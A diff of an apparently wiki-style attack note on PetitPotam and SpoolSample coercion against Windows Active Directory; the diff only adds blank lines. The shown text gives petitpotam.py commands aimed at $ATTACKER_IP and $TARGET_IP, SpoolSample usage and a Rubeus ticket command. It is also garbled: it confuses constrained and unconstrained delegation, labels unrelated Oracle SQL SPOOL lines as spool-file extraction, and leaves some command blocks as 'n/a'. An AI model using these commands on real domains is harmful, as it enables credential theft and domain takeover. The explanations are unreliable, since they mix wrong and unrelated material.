@@ -38,6 +38,8 @@ The MS-EFSRPC protocol is used by the Encrypting File System (EFS) to manage enc
 
 The MS-EFSRPC protocol is used by the Encrypting File System (EFS) to manage encryption keys. The protocol allows clients to remotely access the EFS service on a server. When an Active Directory (AD) user has the 'SeImpersonatePrivilege' privilege and the 'msDS-AllowedToDelegateTo' attribute is set, the user can impersonate another user to access the EFS service. This is known as Kerberos Unconstrained Delegation. An attacker can abuse this feature to obtain the user's credentials and ultimately gain access to sensitive data. The PetitPotam attack is a specific method of abusing Kerberos Unconstrained Delegation to force a server to authenticate to a malicious SMB server, which can then be used to obtain domain credentials.
 
+ 
+
 ## Requirements
 
 1. An AD user with 'SeImpersonatePrivilege' privilege and 'msDS-AllowedToDelegateTo' attribute set
@@ -45,6 +47,8 @@ The MS-EFSRPC protocol is used by the Encrypting File System (EFS) to manage enc
 1. Access to the EFS service on a server
 
 1. Ability to force authentication to a malicious SMB server
+
+ 
 
 ## Defense
 
@@ -54,6 +58,8 @@ The MS-EFSRPC protocol is used by the Encrypting File System (EFS) to manage enc
 
 1. Monitor for unusual authentication activity, such as authentication to a malicious SMB server
 
+ 
+
 ## Objectives
 
 1. Obtain sensitive data encrypted with EFS
@@ -62,13 +68,23 @@ The MS-EFSRPC protocol is used by the Encrypting File System (EFS) to manage enc
 
 1. Obtain domain credentials
 
+ 
+
 # Instructions
 
 1. Run a PetitPotam attack against a Windows Active Directory Certificate Services (AD CS) server.
 
+ 
+
+
+
 **Code**: [[PetitPotam]]
 
+
+
 > This attack abuses the MS-EFSRPC (Encrypting File System Remote Protocol) functionality of Windows Active Directory Certificate Services (AD CS) to force a domain controller to authenticate to an attacker-controlled NTLM relay. This can result in the attacker gaining full domain privileges and compromising the entire Windows domain.
+
+
 
 **Command** ([[Check if target is vulnerable]]):
 
@@ -76,11 +92,17 @@ The MS-EFSRPC protocol is used by the Encrypting File System (EFS) to manage enc
 n/a
 ```
 
+
+
+
+
 **Command** ([[Exploit the vulnerability]]):
 
 ```bash
 n/a
 ```
+
+
 
 2. SpoolSample is a tool used for coercing a callback from the targeted machine. It can be used to gain access to the target machine and execute commands on it. The tool works by exploiting a vulnerability in the Print Spooler service of Windows systems.
 
@@ -93,7 +115,13 @@ To use SpoolSample, follow these steps:
 
 Note: It is important to use this tool ethically and with proper authorization. Unauthorized use of this tool can lead to legal consequences.
 
+ 
+
+
+
 **Code**: [[SpoolSample]]
+
+
 
 > The arguments for SpoolSample are as follows:
 - IP address or hostname of the target machine: This argument specifies the IP address or hostname of the machine that you want to target. It is a required argument.
@@ -101,6 +129,8 @@ Note: It is important to use this tool ethically and with proper authorization. 
 Example usage:
 SpoolSample.exe 192.168.1.100
 SpoolSample.exe targetmachine.domain.com
+
+
 
 **Command** ([[Extract data from spool file]]):
 
@@ -110,12 +140,22 @@ SELECT * FROM employees;
 SPOOL OFF;
 ```
 
+
+
 3. Execute a PetitPotam attack to extract a TGT ticket from a Windows Active Directory environment.
+
+ 
+
+
 
 **Code**: [[# Coerce the callback
 git clone https://github.com]]
 
+
+
 > This command involves cloning the PetitPotam GitHub repository, coercing a callback to the attacker's machine, and executing the PetitPotam script with specific arguments. The script will then extract a TGT ticket for the specified user account and domain controller. The extracted ticket is then passed to Rubeus to obtain the user's Kerberos ticket-granting ticket (TGT).
+
+
 
 **Command** ([[PetitPotam Clone and Execution]]):
 
@@ -125,11 +165,17 @@ python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
 python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
 ```
 
+
+
+
+
 **Command** ([[Extract TGT]]):
 
 ```bash
 .\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -158,3 +204,5 @@ python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
 - [[Active Directory Attacks]]
 - [[Kerberos Unconstrained Delegation]]
 - [[MS-EFSRPC Abuse with Unconstrained Delegation]]
+
+
